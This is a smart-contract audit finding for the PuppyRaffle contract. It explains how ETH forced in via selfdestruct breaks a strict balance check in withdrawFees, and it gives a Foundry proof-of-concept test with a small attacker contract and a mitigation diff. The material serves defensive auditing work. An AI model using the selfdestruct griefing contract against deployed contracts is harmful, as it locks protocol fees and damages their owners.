### [S-#] Strict Balance Check in `PuppyRaffle::withdrawFees` Can Be Broken by Forced ETH

**Description:** The `PuppyRaffle::withdrawFees` function requires the contract's ETH balance to be exactly equal to `totalFees` before allowing the fee address to withdraw.

```javascript
function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

However, an attacker can force ETH into the contract using `selfdestruct`, even if the target contract does not have a payable function. This makes `address(this).balance` greater than `totalFees`, causing the strict equality check to fail and preventing fees from being withdrawn.

**Impact:** An attacker can permanently block `PuppyRaffle::withdrawFees` by forcing extra ETH into the contract after fees have been accounted for.

This locks the protocol fees inside the contract and prevents the configured `feeAddress` from collecting them.

**Proof of Concept:**

After the raffle selects a winner, `totalFees` is set to the protocol fee amount. The attacker then deploys a contract, funds it with ETH, and calls `selfdestruct` to force ETH into `PuppyRaffle`. Since the contract balance is now larger than `totalFees`, `withdrawFees` reverts.

<details>
<summary>Code</summary>

```js
function testWithdrawFeesFail() public {
    address[] memory players = new address[](4);
    players[0] = address(1);
    players[1] = address(2);
    players[2] = address(3);
    players[3] = address(4);
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);
    puppyRaffle.selectWinner();

    WithdrawFees_destructionAttack attacker = new WithdrawFees_destructionAttack(puppyRaffle);
    vm.deal(address(attacker), 1 ether);
    attacker.attack();

    vm.expectRevert();
    puppyRaffle.withdrawFees();
}

contract WithdrawFees_destructionAttack {
    PuppyRaffle puppyRaffle;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }

    function attack() external {
        selfdestruct(payable(address(puppyRaffle)));
    }
}
```

</details>

**Recommended Mitigation:** Avoid relying on strict equality between `address(this).balance` and internal accounting. Instead, only require that the contract has enough ETH to pay the tracked fees.

```diff
function withdrawFees() external {
-   require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
+   require(address(this).balance >= uint256(totalFees), "PuppyRaffle: Insufficient balance to withdraw fees");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

Alternatively, track active player funds separately from protocol fees and use internal accounting to determine whether fees are withdrawable, rather than using the whole contract balance as the source of truth.
